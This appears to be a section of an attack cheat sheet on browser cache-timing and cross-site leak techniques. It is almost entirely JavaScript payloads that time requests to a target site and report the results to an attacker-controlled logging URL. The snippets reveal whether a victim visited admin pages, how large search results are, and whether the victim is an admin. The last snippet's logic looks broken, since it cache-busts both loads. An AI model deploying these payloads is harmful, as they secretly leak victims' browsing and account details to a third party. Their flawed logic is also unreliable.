## ========================================
## CACHE PROBING
## ========================================

# Detect if resource cached
<script>
function probe(url) {
  var start = performance.now();
  fetch(url, {mode: 'no-cors', cache: 'force-cache'})
    .finally(() => {
      var time = performance.now() - start;
      if (time < 10) {
        // Resource was cached (user visited before)
        fetch('http://attacker.com/log?cached=' + url);
      }
    });
}

probe('http://target.com/admin/panel.css');
</script>

# Infer response size via timing
<script>
var sizes = {};
function measureSize(url, id) {
  var start = performance.now();
  fetch(url, {mode: 'no-cors'})
    .finally(() => {
      sizes[id] = performance.now() - start;
    });
}

measureSize('http://target.com/search?q=a', 'a');
measureSize('http://target.com/search?q=admin', 'admin');

setTimeout(() => {
  if (sizes['admin'] > sizes['a']) {
    // "admin" returned more results
    fetch('http://attacker.com/log?found=admin');
  }
}, 2000);
</script>

## BROWSER CACHE TIMING
## ========================================

# Advanced cache timing
<script>
function cacheProbe(url) {
  return new Promise((resolve) => {
    var img = new Image();
    var start = performance.now();
    img.onload = img.onerror = () => {
      var time = performance.now() - start;
      resolve(time);
    };
    img.src = url + '?cache_bust=' + Math.random();
  });
}

async function detect() {
  // First load (cache miss)
  await cacheProbe('http://target.com/admin.png');
  
  // Second load (cache hit if accessible)
  var time = await cacheProbe('http://target.com/admin.png');
  
  if (time < 50) {
    // Cached = accessible = user is admin
    fetch('http://attacker.com/log?admin=true');
  }
}

detect();
</script>
